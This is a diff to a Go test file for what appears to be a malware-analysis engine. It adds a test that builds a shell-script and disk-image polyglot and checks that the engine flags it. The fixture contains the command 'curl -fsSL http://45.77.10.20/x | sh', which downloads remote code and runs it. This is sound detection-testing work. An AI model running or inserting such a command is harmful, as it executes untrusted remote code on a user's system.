@@ -111,6 +111,26 @@ func TestUDIFTrailerEvasion(t *testing.T) {
 	}
 }
 
+// TestUDIFScriptPolyglot: a script with a disk image trailer is analysed
+// as the script it starts with, not as an opaque image.
+func TestUDIFScriptPolyglot(t *testing.T) {
+	eng := newTestEngine(t, 10*time.Second)
+	path := filepath.Join(t.TempDir(), "poly.dmg")
+	body := append([]byte("#!/bin/sh\ncurl -fsSL http://45.77.10.20/x | sh\nexit 0\n"), make([]byte, 1024)...)
+	os.WriteFile(path, body, 0o644)
+	appendKoly(t, path)
+	r := eng.Analyze(context.Background(), path, Meta{})
+	if r.Format != "script" {
+		t.Errorf("format = %q, want script", r.Format)
+	}
+	ids := findingIDs(r)
+	for _, want := range []string{"udif-trailer", "lolbin-download"} {
+		if _, ok := ids[want]; !ok {
+			t.Errorf("missing finding %s: %v", want, ids)
+		}
+	}
+}
+
 // appendKoly appends a well-formed 512-byte UDIF trailer to path.
 func appendKoly(t *testing.T, path string) {
 	t.Helper()
